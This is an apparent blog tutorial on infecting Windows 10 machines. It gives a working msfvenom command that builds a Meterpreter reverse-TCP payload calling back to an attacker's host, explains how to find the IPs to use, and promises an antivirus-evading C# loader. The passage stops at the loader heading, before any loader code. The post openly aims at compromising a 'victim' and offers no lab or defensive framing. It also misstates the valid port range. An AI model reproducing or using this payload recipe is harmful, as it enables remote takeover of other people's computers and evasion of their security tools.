---
layout: post
title:  "Infecting Windows 10"
date:   2023-06-30 21:21:21 +0530
tags: [csharp,kali-linux,virus]
---

**Introduction to Infecting Windows 10**  

For my first post that has actual content, I am going to show you guys how to create a payload in Metasploit on Kali Linux and then create a loader for it in C#!

**Step 1: Creating the Payload**

First you need to hop on Kali and open a terminal. Then we are going to use a command to create the payload to use. Type the following in your terminal:
```bash
$ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f csharp > payload.cs
```
Okay so, what does this do? This command creates a csharp file containing the payload bytes we will execute in the loader.

<i>HOST</i> refers to the ip of the attacker (127.0.0.1)  
<i>PORT</i> refers to the port that you will listen to on the offending machine (4444)  

To find your local IP address do the following command:  
```bash
$ ifconfig
```  
You should see something like this:  
<img src="https://char2int.com/assets/image01.webp" alt="image01">  

To find your public IP address do the following command:  
```bash
$ curl icanhazip.com
```  
You should see something like this:  
<img src="https://char2int.com/assets/image02.webp" alt="image02">  

You can change your port to any number between **0 and 65536**.  

You now have your payload and it's time to infect your victim! Except, oh wait! How do we execute it? Most methods of executing these bytes are detected by every antivirus under the sun! Head to step two to find out how to use this payload you created!  

**Step 2: Creating the Loader**  